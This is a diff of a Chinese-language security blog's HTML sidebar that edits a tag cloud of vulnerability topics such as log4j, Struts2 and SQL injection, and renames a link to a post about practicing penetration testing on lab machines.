-        <a href="/tags/Apache-2-4-49/" style="font-size: 0.6em;">Apache 2.4.49</a> <a href="/tags/Spring-Boot/" style="font-size: 0.6em;">Spring Boot</a> <a href="/tags/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/" style="font-size: 0.6em;">Struts2漏洞复现总结</a> <a href="/tags/awvs/" style="font-size: 0.6em;">awvs</a> <a href="/tags/burpsutie/" style="font-size: 0.6em;">burpsutie</a> <a href="/tags/iis/" style="font-size: 0.6em;">iis</a> <a href="/tags/log4j/" style="font-size: 0.6em;">log4j</a> <a href="/tags/sql-%E6%B3%A8%E5%85%A5/" style="font-size: 0.6em;">sql 注入</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 0.6em;">信息收集</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.6em;">文件上传</a> <a href="/tags/%E6%BA%AF%E6%BA%90/" style="font-size: 0.6em;">溯源</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size: 0.6em;">漏洞扫描</a>
+        <a href="/tags/Apache-2-4-49/" style="font-size: 0.6em;">Apache 2.4.49</a> <a href="/tags/Spring-Boot/" style="font-size: 0.6em;">Spring Boot</a> <a href="/tags/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/" style="font-size: 0.6em;">Struts2漏洞复现总结</a> <a href="/tags/iis/" style="font-size: 0.6em;">iis</a> <a href="/tags/log4j/" style="font-size: 0.6em;">log4j</a> <a href="/tags/sql-%E6%B3%A8%E5%85%A5/" style="font-size: 0.6em;">sql 注入</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 0.6em;">信息收集</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.6em;">文件上传</a> <a href="/tags/%E6%BA%AF%E6%BA%90/" style="font-size: 0.6em;">溯源</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size: 0.6em;">漏洞扫描</a>
       </div>
   </aside>
 
@@ -699,7 +699,7 @@
         
           
           
-            <a class="list-group-item" href="/2022/11/30/%E6%B8%97%E9%80%8F/"><i class="fa  fa-book"></i> 渗透</a>
+            <a class="list-group-item" href="/2022/11/30/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95/"><i class="fa  fa-book"></i> 渗透学习靶机打靶思路与方法</a>
             
           
         
@@ -727,8 +727,6 @@
             
           
         
-          
-            
           
             
           
